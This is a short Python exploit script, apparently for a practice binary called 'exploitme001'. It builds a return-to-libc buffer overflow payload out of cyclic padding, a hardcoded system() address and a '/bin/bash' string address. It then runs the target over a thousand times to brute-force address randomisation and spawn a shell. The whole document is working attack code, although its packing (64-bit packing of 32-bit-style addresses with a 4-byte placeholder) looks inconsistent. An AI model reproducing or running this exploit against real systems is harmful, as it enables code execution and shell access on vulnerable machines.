#!/usr/bin/python

from pwn import *
import subprocess as sp
import os

# raac - crash data
# system_ofset - 0x000458b0
# /bin/bash ofset - 0x19042d

padding = "A"*cyclic_find('raac')

system = p64(0x000458b0+0xf7d05000)
exit = 'JUNK'
bin_sh = p64(0x19042d+0xf7d05000)

exploit = padding
exploit += system 
exploit += exit
exploit += bin_sh

file('exploit','wb').write(exploit)

for i in range(0,1024):
    os.system('./exploitme001 `cat exploit`')
    print('attempt %d'%i)
